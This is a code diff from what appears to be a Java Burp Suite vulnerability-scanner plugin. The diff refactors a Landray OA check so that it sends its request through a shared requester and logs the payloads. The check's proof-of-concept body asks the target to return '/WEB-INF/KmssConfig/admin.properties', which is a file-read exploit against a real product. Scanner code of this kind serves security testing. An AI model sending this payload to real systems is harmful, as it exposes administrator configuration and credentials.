@@ -25,8 +25,7 @@ public class LandrayOa extends VulTaskImpl {
                 "Accept-Encoding: gzip\n" +
                 "\n";
         String poc_body = "var={\"body\":{\"file\":\"/WEB-INF/KmssConfig/admin.properties\"}}";
-        byte[] req = this.helpers.buildHttpMessage(Arrays.asList(poc_req.split("\n")), poc_body.getBytes());
-        IHttpRequestResponse messageInfo1 = this.callbacks.makeHttpRequest(iHttpService, req);
+        IHttpRequestResponse messageInfo1 = BurpExtender.requester.send(this.iHttpService, Arrays.asList(poc_req.split("\n")), poc_body.getBytes());
         //新请求信息
         IRequestInfo analyzeRequest = this.helpers.analyzeRequest(messageInfo1);
         //新的返回包
@@ -43,7 +42,7 @@ public class LandrayOa extends VulTaskImpl {
         }
 
         if (!message.equalsIgnoreCase("")){
-            result = logAdd(messageInfo_r, host, path, method, status, message, "");
+            result = logAdd(messageInfo_r, host, path, method, status, message, payloads);
         }
 
         return result;
